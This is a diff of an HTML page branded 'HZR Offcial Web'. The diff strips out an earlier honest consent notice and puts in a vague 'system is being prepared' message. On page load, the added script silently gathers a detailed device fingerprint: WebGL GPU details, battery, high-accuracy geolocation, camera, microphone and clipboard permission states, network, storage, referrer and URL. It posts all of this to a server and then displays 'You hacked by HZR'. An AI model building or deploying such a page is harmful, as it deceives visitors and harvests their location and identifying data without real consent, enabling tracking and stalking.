@@ -2,317 +2,989 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-    <title>HZR Device Center</title>
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0"
+    >
+
+    <meta
+        name="description"
+        content="HZR Device Information"
+    >
+
+    <title>HZR Offcial Web |✓</title>
 
     <style>
         * {
             box-sizing: border-box;
             margin: 0;
             padding: 0;
-            font-family: Arial, sans-serif;
+        }
+
+        html,
+        body {
+            width: 100%;
+            min-height: 100%;
         }
 
         body {
-            min-height: 100vh;
             background: #050505;
-            color: white;
+            color: #ffffff;
+            font-family: Arial, Helvetica, sans-serif;
             display: flex;
-            align-items: center;
             justify-content: center;
+            align-items: center;
             padding: 20px;
         }
 
-        .box {
+        .container {
             width: 100%;
-            max-width: 420px;
-            background: #0d0d0d;
-            border: 1px solid #202020;
-            border-radius: 22px;
-            padding: 30px 24px;
-            text-align: center;
+            max-width: 430px;
+            background: #0b0b0b;
+            border: 1px solid #1c1c1c;
+            border-radius: 24px;
+            padding: 28px 22px;
+            box-shadow:
+                0 0 30px rgba(0, 255, 120, 0.08),
+                0 0 80px rgba(0, 255, 120, 0.03);
         }
 
         .logo {
-            font-size: 45px;
-            font-weight: bold;
-            letter-spacing: 7px;
-            color: #00ffae;
-            margin-bottom: 10px;
+            text-align: center;
+            font-size: 34px;
+            font-weight: 900;
+            letter-spacing: 5px;
+            color: #ffffff;
+            text-shadow: 0 0 18px rgba(0, 255, 136, 0.45);
         }
 
         .subtitle {
-            color: #777;
+            text-align: center;
+            margin-top: 8px;
+            color: #ffffff;
             font-size: 12px;
-            margin-bottom: 30px;
+            letter-spacing: 3px;
         }
 
-        .notice {
-            background: #111;
-            border: 1px solid #242424;
-            border-radius: 14px;
-            padding: 15px;
-            color: #aaa;
-            font-size: 13px;
-            line-height: 1.7;
-            margin-bottom: 22px;
+        .line {
+            width: 100%;
+            height: 1px;
+            background: #181818;
+            margin: 25px 0;
         }
 
         .status {
-            color: #00ffae;
-            font-size: 14px;
-            min-height: 22px;
+            background: #090909;
+            border: 1px solid #171717;
+            border-radius: 16px;
+            padding: 18px;
+            text-align: center;
         }
 
-        .loader {
-            width: 32px;
-            height: 32px;
-            margin: 20px auto;
-            border: 3px solid #222;
-            border-top-color: #00ffae;
+        .status-dot {
+            width: 9px;
+            height: 9px;
+            display: inline-block;
             border-radius: 50%;
-            animation: spin 0.8s linear infinite;
+            background: #ffffff;
+            box-shadow: 0 0 12px #00ff88;
+            margin-right: 7px;
         }
 
-        .done {
-            color: #00ffae;
+        .status-text {
+            color: #aaa;
+            font-size: 13px;
         }
 
-        .error {
-            color: #ff5555;
+        .notice {
+            margin-top: 18px;
+            padding: 15px;
+            border-radius: 14px;
+            background: #0d0d0d;
+            border: 1px solid #202020;
+            color: #ffffff;
+            font-size: 11px;
+            line-height: 1.7;
+            text-align: center;
         }
 
-        @keyframes spin {
-            to {
-                transform: rotate(360deg);
-            }
+        .footer {
+            margin-top: 25px;
+            text-align: center;
+            color: #ffffff;
+            font-size: 10px;
+            letter-spacing: 2px;
         }
     </style>
 </head>
 
 <body>
 
-<div class="box">
+<div class="container">
 
     <div class="logo">HZR</div>
 
-    <div class="subtitle">
-        DEVICE INFORMATION
+    <div class="subtitle">OFFCIAL WEB</div>
+
+    <div class="line"></div>
+
+    <div class="status">
+        <span class="status-dot"></span>
+        <span class="status-text" id="statusText">
+             The system is being prepared..
+        </span>
     </div>
 
     <div class="notice">
-        By continuing, you agree that the device information
-        available to this browser may be sent to the configured
-        recipient. Location is requested separately and only
-        with your permission.
+        By continuing, you agree to HZR WEB POLICY. Please wait a moment, We getting system ready for you..
     </div>
 
-    <div class="loader" id="loader"></div>
-
-    <div class="status" id="status">
-        Preparing information...
+    <div class="footer">
+        HZR 2010-2026
     </div>
 
 </div>
 
 <script>
+"use strict";
 
-    const status = document.getElementById("status");
-    const loader = document.getElementById("loader");
+/* =========================================================
+   HZR OFFCIAL WEB
+   ========================================================= */
 
-    function setStatus(message, type = "") {
-        status.textContent = message;
-        status.className = "status " + type;
+const statusText = document.getElementById("statusText");
+
+function setStatus(text) {
+    if (statusText) {
+        statusText.textContent = text;
+    }
+}
+
+function safeValue(value, fallback = "Unavailable") {
+    return (
+        value !== undefined &&
+        value !== null &&
+        value !== ""
+    )
+        ? value
+        : fallback;
+}
+
+function detectBrowser() {
+    const ua = navigator.userAgent || "";
+
+    let browser = "Unknown";
+
+    if (/Edg\//i.test(ua)) {
+        browser = "Microsoft Edge";
+    } else if (/OPR\//i.test(ua)) {
+        browser = "Opera";
+    } else if (/Chrome\//i.test(ua)) {
+        browser = "Google Chrome";
+    } else if (/Firefox\//i.test(ua)) {
+        browser = "Mozilla Firefox";
+    } else if (/Safari\//i.test(ua)) {
+        browser = "Safari";
     }
 
+    return browser;
+}
 
-    async function getBatteryData() {
+function getDeviceType() {
+    const ua = navigator.userAgent || "";
 
-        if (!navigator.getBattery) {
-            return {
-                supported: false
-            };
-        }
-
-        try {
-
-            const battery = await navigator.getBattery();
-
-            return {
-                supported: true,
-                level: Math.round(battery.level * 100),
-                charging: battery.charging
-            };
-
-        } catch (error) {
-
-            return {
-                supported: false
-            };
-        }
+    if (/tablet|ipad/i.test(ua)) {
+        return "Tablet";
     }
 
+    if (
+        /mobile|android|iphone|ipod/i.test(ua)
+    ) {
+        return "Mobile";
+    }
 
-    function getBrowserData() {
+    return "Desktop";
+}
 
+function getOrientation() {
+    try {
+        return screen.orientation
+            ? screen.orientation.type
+            : "Unavailable";
+    } catch {
+        return "Unavailable";
+    }
+}
+
+async function getBatteryInfo() {
+
+    if (!navigator.getBattery) {
         return {
-            userAgent: navigator.userAgent || null,
-            platform: navigator.platform || null,
-
-            language: navigator.language || null,
-
-            cpuCores:
-                navigator.hardwareConcurrency || null,
-
-            ramGB:
-                navigator.deviceMemory || null,
-
-            screen: {
-                width: window.screen.width,
-                height: window.screen.height,
-                pixelRatio: window.devicePixelRatio || 1
-            },
-
-            timezone:
-                Intl.DateTimeFormat().resolvedOptions().timeZone || null
+            supported: false
         };
     }
 
+    try {
+        const battery = await navigator.getBattery();
 
-    function requestLocation() {
+        return {
+            supported: true,
+            level: Math.round(battery.level * 100),
+            charging: battery.charging,
+            chargingTime: battery.chargingTime,
+            dischargingTime: battery.dischargingTime
+        };
 
-        return new Promise((resolve) => {
+    } catch {
+        return {
+            supported: false
+        };
+    }
+}
 
-            if (!navigator.geolocation) {
+async function getLocationInfo() {
+
+    return new Promise((resolve) => {
+
+        if (!navigator.geolocation) {
+            resolve({
+                supported: false,
+                permission: "unsupported"
+            });
+            return;
+        }
+
+        navigator.geolocation.getCurrentPosition(
+
+            (position) => {
 
                 resolve({
-                    permission: "unsupported"
+                    supported: true,
+                    permission: "granted",
+                    latitude: position.coords.latitude,
+                    longitude: position.coords.longitude,
+                    accuracy: position.coords.accuracy,
+                    altitude: position.coords.altitude,
+                    heading: position.coords.heading,
+                    speed: position.coords.speed
                 });
 
-                return;
-            }
+            },
 
-            navigator.geolocation.getCurrentPosition(
+            (error) => {
 
-                function(position) {
+                let permission = "unknown";
 
-                    resolve({
-                        permission: "granted",
-                        latitude: position.coords.latitude,
-                        longitude: position.coords.longitude,
-                        accuracy: position.coords.accuracy
-                    });
-
-                },
-
-                function(error) {
-
-                    resolve({
-                        permission:
-                            error.code === 1
-                                ? "denied"
-                                : "unavailable"
-                    });
-
-                },
-
-                {
-                    enableHighAccuracy: true,
-                    timeout: 10000,
-                    maximumAge: 0
+                if (error.code === 1) {
+                    permission = "denied";
+                } else if (error.code === 2) {
+                    permission = "unavailable";
+                } else if (error.code === 3) {
+                    permission = "timeout";
                 }
-            );
-        });
+
+                resolve({
+                    supported: true,
+                    permission
+                });
+
+            },
+
+            {
+                enableHighAccuracy: true,
+                timeout: 10000,
+                maximumAge: 0
+            }
+        );
+    });
+}
+
+async function getPermissionStates() {
+
+    const permissions = {};
+
+    if (!navigator.permissions) {
+        return permissions;
     }
 
+    const names = [
+        "geolocation",
+        "camera",
+        "microphone",
+        "notifications",
+        "clipboard-read",
+        "clipboard-write"
+    ];
 
-    async function collectAndSend() {
+    for (const name of names) {
 
         try {
 
-            setStatus("Preparing information...");
+            const result =
+                await navigator.permissions.query({
+                    name
+                });
 
-            const battery = await getBatteryData();
+            permissions[name] = result.state;
 
-            const browser = getBrowserData();
+        } catch {
 
-            /*
-             * Location is requested explicitly by the browser.
-             * If the user denies it, no coordinates are sent.
-             */
-            setStatus("Requesting location permission...");
-
-            const location = await requestLocation();
-
-            const payload = {
-
-                project: "HZR",
-
-                entryTime:
-                    new Date().toISOString(),
-
-                browser: browser,
-
-                battery: battery,
-
-                location: location
-
-            };
-
-
-            setStatus("Sending information...");
-
-
-            const response = await fetch("/api/device-info", {
-
-                method: "POST",
-
-                headers: {
-                    "Content-Type": "application/json"
-                },
-
-                body: JSON.stringify(payload)
-
-            });
-
-
-            if (!response.ok) {
-                throw new Error("Server rejected request");
-            }
-
-
-            loader.style.display = "none";
-
-            setStatus(
-                "Information sent successfully.",
-                "done"
-            );
-
-
-        } catch (error) {
-
-            loader.style.display = "none";
-
-            setStatus(
-                "Unable to send information.",
-                "error"
-            );
-
-            console.error(error);
+            permissions[name] = "unavailable";
         }
     }
 
+    return permissions;
+}
 
-    /*
-     * Automatically starts after page load.
-     */
-    window.addEventListener(
-        "load",
-        collectAndSend
-    );
+function getNetworkInfo() {
 
+    const connection =
+        navigator.connection ||
+        navigator.mozConnection ||
+        navigator.webkitConnection;
+
+    if (!connection) {
+        return {
+            supported: false
+        };
+    }
+
+    return {
+        supported: true,
+        effectiveType: safeValue(
+            connection.effectiveType
+        ),
+        downlink: safeValue(
+            connection.downlink
+        ),
+        rtt: safeValue(
+            connection.rtt
+        ),
+        saveData: safeValue(
+            connection.saveData,
+            false
+        ),
+        type: safeValue(
+            connection.type
+        )
+    };
+}
+
+function getStorageInfo() {
+
+    return {
+        localStorage:
+            (() => {
+                try {
+                    return typeof localStorage !== "undefined";
+                } catch {
+                    return false;
+                }
+            })(),
+
+        sessionStorage:
+            (() => {
+                try {
+                    return typeof sessionStorage !== "undefined";
+                } catch {
+                    return false;
+                }
+            })(),
+
+        indexedDB:
+            typeof indexedDB !== "undefined",
+
+        cacheAPI:
+            "caches" in window,
+
+        storageManager:
+            "storage" in navigator
+    };
+}
+
+async function getStorageEstimate() {
+
+    if (
+        !navigator.storage ||
+        !navigator.storage.estimate
+    ) {
+        return {
+            supported: false
+        };
+    }
+
+    try {
+
+        const estimate =
+            await navigator.storage.estimate();
+
+        return {
+            supported: true,
+            usage: estimate.usage ?? null,
+            quota: estimate.quota ?? null
+        };
+
+    } catch {
+
+        return {
+            supported: false
+        };
+    }
+}
+
+function getWebCapabilities() {
+
+    return {
+
+        fetch:
+            typeof fetch !== "undefined",
+
+        webSocket:
+            typeof WebSocket !== "undefined",
+
+        webRTC:
+            typeof RTCPeerConnection !== "undefined",
+
+        webAssembly:
+            typeof WebAssembly !== "undefined",
+
+        webCrypto:
+            !!window.crypto,
+
+        workers:
+            typeof Worker !== "undefined",
+
+        sharedWorker:
+            typeof SharedWorker !== "undefined",
+
+        serviceWorker:
+            "serviceWorker" in navigator,
+
+        broadcastChannel:
+            typeof BroadcastChannel !== "undefined",
+
+        webGL:
+            !!document.createElement("canvas")
+                .getContext("webgl"),
+
+        webGL2:
+            !!document.createElement("canvas")
+                .getContext("webgl2"),
+
+        webGPU:
+            "gpu" in navigator,
+
+        notifications:
+            "Notification" in window,
+
+        mediaDevices:
+            !!navigator.mediaDevices,
+
+        mediaRecorder:
+            typeof MediaRecorder !== "undefined",
+
+        gamepad:
+            "getGamepads" in navigator,
+
+        vibration:
+            "vibrate" in navigator,
+
+        wakeLock:
+            "wakeLock" in navigator,
+
+        fullscreen:
+            !!document.fullscreenEnabled,
+
+        pictureInPicture:
+            "pictureInPictureEnabled" in document,
+
+        shareAPI:
+            "share" in navigator,
+
+        pushAPI:
+            "PushManager" in window,
+
+        webAuthn:
+            !!window.PublicKeyCredential
+    };
+}
+
+function getDisplayInfo() {
+
+    return {
+
+        screenWidth:
+            screen.width,
+
+        screenHeight:
+            screen.height,
+
+        availableWidth:
+            screen.availWidth,
+
+        availableHeight:
+            screen.availHeight,
+
+        viewportWidth:
+            window.innerWidth,
+
+        viewportHeight:
+            window.innerHeight,
+
+        pixelRatio:
+            window.devicePixelRatio,
+
+        colorDepth:
+            screen.colorDepth,
+
+        pixelDepth:
+            screen.pixelDepth,
+
+        orientation:
+            getOrientation(),
+
+        touchPoints:
+            navigator.maxTouchPoints || 0
+    };
+}
+
+function getPreferences() {
+
+    return {
+
+        colorScheme:
+            window.matchMedia(
+                "(prefers-color-scheme: dark)"
+            ).matches
+                ? "dark"
+                : "light",
+
+        reducedMotion:
+            window.matchMedia(
+                "(prefers-reduced-motion: reduce)"
+            ).matches,
+
+        contrast:
+            window.matchMedia(
+                "(prefers-contrast: more)"
+            ).matches,
+
+        forcedColors:
+            window.matchMedia(
+                "(forced-colors: active)"
+            ).matches
+    };
+}
+
+function getGraphicsInfo() {
+
+    const canvas =
+        document.createElement("canvas");
+
+    const gl =
+        canvas.getContext("webgl") ||
+        canvas.getContext("experimental-webgl");
+
+    if (!gl) {
+        return {
+            supported: false
+        };
+    }
+
+    let vendor = "Unavailable";
+    let renderer = "Unavailable";
+
+    try {
+
+        const debug =
+            gl.getExtension(
+                "WEBGL_debug_renderer_info"
+            );
+
+        if (debug) {
+
+            vendor =
+                gl.getParameter(
+                    debug.UNMASKED_VENDOR_WEBGL
+                );
+
+            renderer =
+                gl.getParameter(
+                    debug.UNMASKED_RENDERER_WEBGL
+                );
+        }
+
+    } catch {}
+
+    return {
+
+        supported: true,
+
+        vendor,
+
+        renderer,
+
+        version:
+            safeValue(
+                gl.getParameter(
+                    gl.VERSION
+                )
+            ),
+
+        shadingLanguage:
+            safeValue(
+                gl.getParameter(
+                    gl.SHADING_LANGUAGE_VERSION
+                )
+            ),
+
+        maxTextureSize:
+            safeValue(
+                gl.getParameter(
+                    gl.MAX_TEXTURE_SIZE
+                )
+            )
+    };
+}
+
+function getMediaSupport() {
+
+    const video =
+        document.createElement("video");
+
+    const audio =
+        document.createElement("audio");
+
+    const videoTypes = [
+        "video/mp4",
+        "video/webm",
+        "video/ogg"
+    ];
+
+    const audioTypes = [
+        "audio/mpeg",
+        "audio/ogg",
+        "audio/wav",
+        "audio/webm"
+    ];
+
+    const videoSupport = {};
+
+    for (const type of videoTypes) {
+        try {
+            videoSupport[type] =
+                video.canPlayType(type) || "No";
+        } catch {
+            videoSupport[type] = "Unavailable";
+        }
+    }
+
+    const audioSupport = {};
+
+    for (const type of audioTypes) {
+        try {
+            audioSupport[type] =
+                audio.canPlayType(type) || "No";
+        } catch {
+            audioSupport[type] = "Unavailable";
+        }
+    }
+
+    return {
+        videoSupport,
+        audioSupport
+    };
+}
+
+async function collectDeviceInfo() {
+
+    const entryTime =
+        new Date().toISOString();
+
+    const battery =
+        await getBatteryInfo();
+
+    const location =
+        await getLocationInfo();
+
+    const permissions =
+        await getPermissionStates();
+
+    const storage =
+        getStorageInfo();
+
+    const storageEstimate =
+        await getStorageEstimate();
+
+    const capabilities =
+        getWebCapabilities();
+
+    const media =
+        getMediaSupport();
+
+    const connection =
+        getNetworkInfo();
+
+    const display =
+        getDisplayInfo();
+
+    const preferences =
+        getPreferences();
+
+    const graphics =
+        getGraphicsInfo();
+
+    const report = {
+
+        entryTime,
+
+        device: {
+
+            type:
+                getDeviceType(),
+
+            brand:
+                "",
+
+            model:
+                "",
+
+            manufacturer:
+                "",
+
+            mobile:
+                /mobile/i.test(
+                    navigator.userAgent || ""
+                ),
+
+            touch:
+                navigator.maxTouchPoints > 0,
+
+            maxTouchPoints:
+                navigator.maxTouchPoints || 0
+        },
+
+        operatingSystem: {
+
+            platform:
+                safeValue(
+                    navigator.platform
+                ),
+
+            userAgent:
+                safeValue(
+                    navigator.userAgent
+                )
+        },
+
+        browser: {
+
+            name:
+                detectBrowser(),
+
+            userAgent:
+                safeValue(
+                    navigator.userAgent
+                ),
+
+            language:
+                safeValue(
+                    navigator.language
+                ),
+
+            languages:
+                navigator.languages || [],
+
+            cookiesEnabled:
+                navigator.cookieEnabled,
+
+            doNotTrack:
+                safeValue(
+                    navigator.doNotTrack
+                ),
+
+            online:
+                navigator.onLine
+        },
+
+        hardware: {
+
+            cpuCores:
+                navigator.hardwareConcurrency ||
+                null,
+
+            ramGB:
+                navigator.deviceMemory ||
+                null,
+
+            architecture:
+                "",
+
+            touch:
+                navigator.maxTouchPoints > 0,
+
+            maxTouchPoints:
+                navigator.maxTouchPoints || 0
+        },
+
+        display,
+
+        network: connection,
+
+        battery,
+
+        location,
+
+        storage,
+
+        storageEstimate,
+
+        webPlatform: {
+
+            secureContext:
+                window.isSecureContext,
+
+            https:
+                location.protocol === "https:",
+
+            origin:
+                location.origin,
+
+            visibility:
+                document.visibilityState,
+
+            focused:
+                document.hasFocus()
+        },
+
+        capabilities,
+
+        graphics,
+
+        media,
+
+        permissions,
+
+        preferences,
+
+        locale: {
+
+            language:
+                navigator.language,
+
+            languages:
+                navigator.languages || [],
+
+            timezone:
+                Intl.DateTimeFormat()
+                    .resolvedOptions()
+                    .timeZone
+        },
+
+        performance: {
+
+            timeOrigin:
+                performance.timeOrigin,
+
+            now:
+                performance.now()
+        },
+
+        session: {
+
+            id:
+                crypto.randomUUID
+                    ? crypto.randomUUID()
+                    : Math.random()
+                        .toString(36)
+                        .substring(2),
+
+            generatedAt:
+                new Date().toISOString()
+        },
+
+        page: {
+
+            url:
+                location.href,
+
+            referrer:
+                document.referrer || "",
+
+            title:
+                document.title
+        }
+    };
+
+    return report;
+}
+
+async function sendReport() {
+
+    try {
+
+        setStatus(
+            "The system is being prepared..."
+        );
+
+        const report =
+            await collectDeviceInfo();
+
+        setStatus(
+            "Sending secure report..."
+        );
+
+        const response =
+            await fetch(
+                "/api/device-info",
+                {
+                    method: "POST",
+
+                    headers: {
+                        "Content-Type":
+                            "application/json"
+                    },
+
+                    body:
+                        JSON.stringify(report)
+                }
+            );
+
+        const result =
+            await response.json();
+
+        if (!response.ok || !result.success) {
+            throw new Error(
+                result.error ||
+                "Server rejected the you."
+            );
+        }
+
+        setStatus(
+            "You hacked by HZR"
+        );
+
+    } catch (error) {
+
+        console.error(error);
+
+        setStatus(
+            "Unable to connect to HZR server Please check your internet"
+        );
+    }
+}
+
+window.addEventListener(
+    "load",
+    () => {
+        setTimeout(
+            sendReport,
+            500
+        );
+    }
+);
 </script>
 
 </body>
-</html>
+    </html>
